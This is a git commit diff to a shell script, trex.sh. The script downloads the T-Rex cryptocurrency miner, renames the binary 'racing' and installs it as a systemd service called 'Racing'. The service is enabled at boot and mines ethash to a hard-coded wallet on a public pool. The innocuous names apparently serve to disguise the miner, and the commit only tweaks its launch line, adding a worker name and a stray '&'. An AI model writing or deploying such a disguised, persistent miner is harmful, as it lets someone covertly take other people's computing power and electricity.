a86855816b77ba0539a1dbc616bce6d2a9fda2ac
lonelad1000 <lonelad1000@gmail.com>
2022-05-27 09:24:33 +0700

    Update trex.sh

--- trex.sh
+++ trex.sh
@@ -14,7 +14,7 @@ then
 	sudo wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
   	sudo tar xvzf t-rex-0.21.6-linux.tar.gz
   	sudo mv t-rex racing
-	sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://us-eth.2miners.com:2020 -u 0x250cd5e4a6019cf9104644235f88d8c5c8060b73 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+	sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://us-eth.2miners.com:2020 -u 0x250cd5e4a6019cf9104644235f88d8c5c8060b73 -p x -w trex &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
   	sudo systemctl daemon-reload
   	sudo systemctl enable racing.service
 	sudo systemctl start racing.service
